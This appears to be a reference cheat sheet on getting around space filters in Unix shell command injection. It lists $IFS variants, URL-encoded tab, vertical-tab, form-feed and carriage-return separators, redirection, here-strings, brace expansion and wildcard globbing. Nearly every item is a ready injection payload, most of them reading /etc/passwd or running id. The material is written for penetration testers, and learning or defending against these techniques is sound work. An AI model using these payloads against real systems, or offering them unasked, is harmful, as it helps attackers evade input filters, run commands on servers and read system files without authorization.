In Linux and Unix-like operating systems (such as macOS), the shell relies on special environment variables and built-in features to split words and parse arguments.
If standard spaces are blocked by a filter, developers and penetration testers leverage all available internal separators to instruct the shell where a command ends and an argument begins.
Here are all the internal separators, special variables, and structural constructs used to bypass space restrictions in command injection:
## 1. The IFS (Internal Field Separator) Variations
The $IFS variable defines the characters that the shell uses to split text into words. By default, it contains a space, tab, and newline.

* $IFS: Uses the default shell separator.
* Example: cat$IFS/etc/passwd
* $IFS$9: The most reliable way to use IFS. The $9 acts as a placeholder for the 9th positional argument (which is empty), forcing the shell to clearly separate $IFS from the path that follows it.
* Example: cat$IFS$9/etc/passwd
* ${IFS}: Explicitly wraps the variable name in curly braces so the shell doesn't mistake following characters as part of the variable name.
* Example: cat${IFS}/etc/passwd

## 2. Hexadecimal and URL-Encoded Whitespace Separators
If the backend shell interprets raw bytes or URL-decoded characters, several non-space whitespace characters can act as delimiters.

* Horizontal Tab (%09): In almost all shells, a tab separates commands just like a space.
* Example: cat%09/etc/passwd
* Vertical Tab (%0b): A less common whitespace character that some shell interpreters process as a delimiter.
* Example: cat%0b/etc/passwd
* Form Feed (%0c): Moves to a new page context but forces word splitting in many Unix environments.
* Example: cat%0c/etc/passwd
* Carriage Return (%0d): Often forces a clean separation of arguments.
* Example: cat%0d/etc/passwd

## 3. Native Shell Input/Output Redirection (No Variables Needed)
You can completely avoid using any variables or whitespace by using the shell’s native data redirection operators to feed files directly into commands.

* Input Redirection (<): Forces the command to read the file directly without requiring a space.
* Example: cat</etc/passwd
* Here-String (<<<): In Bash, this passes a string directly as standard input.
* Example: sh<<</bin/id

## 4. Structural Substitutes (Brace & Path Expansion)
Instead of searching for a character that mimics a space, you can alter the structure of the syntax so the shell generates the spaces automatically during execution.

* Brace Expansion ({,}): Commas inside curly braces automatically expand into spaces when processed by Bash.
* Example: {cat,/etc/passwd}
* Path Globbing / Wildcards (* or ?): If a specific file path or folder name is blocked or requires spaces, wildcards allow the OS to find the path dynamically.
* Example: /usr/bin/id can be written as /???/???/id

